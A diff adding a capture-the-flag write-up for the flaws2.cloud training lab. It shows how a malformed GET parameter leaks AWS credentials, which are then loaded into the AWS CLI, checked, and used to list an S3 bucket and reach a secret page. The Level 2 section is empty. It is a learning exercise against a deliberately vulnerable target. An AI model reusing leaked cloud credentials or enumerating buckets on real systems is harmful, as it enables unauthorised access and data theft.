@@ -820,7 +820,55 @@ This was pretty fun, barely any setup needed and great for someone starting out.
 
 ## flaws2.cloud (attacker path)
 
-tbd
+## Level 1
+
+Seems to start off as a web challenge, cool! Let's fire up burp
+
+<p align="center">
+  <img width="50%" src="https://github.com/user-attachments/assets/073f62a0-524b-4d7e-95e5-f2bea499b691" >
+</p>
+
+Simply intercept the request and send a string as the code in the GET parameter and the application will break. This will leak AWS credentials
+
+
+<p align="center">
+  <img width="50%" src="https://github.com/user-attachments/assets/bd80a0aa-0036-4944-9cc5-5b20424be41a" >
+</p>
+
+We add them to `~/.aws/credentials` check if they're valid...
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ nano ~/.aws/credentials
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws sts get-caller-identity                                            
+{
+    "UserId": "AROAIBATWWYQXZTTALNCE:level1",
+    "Account": "653711331788",
+    "Arn": "arn:aws:sts::653711331788:assumed-role/level1/level1"
+}
+```
+
+They are! So let's try to list what's inside the bucket
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws s3 ls s3://level1.flaws2.cloud                                                
+                           PRE img/
+2018-11-20 15:55:05      17102 favicon.ico
+2018-11-20 21:00:22       1905 hint1.htm
+2018-11-20 21:00:22       2226 hint2.htm
+2018-11-20 21:00:22       2536 hint3.htm
+2018-11-20 21:00:23       2460 hint4.htm
+2018-11-20 21:00:17       3000 index.htm
+2018-11-20 21:00:17       1899 secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html
+```
+
+Curling or using a browser to fetch the secret HTML reveals Level 2 at http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud.
+
+## Level 2
+
+
+
 
 <br>
 
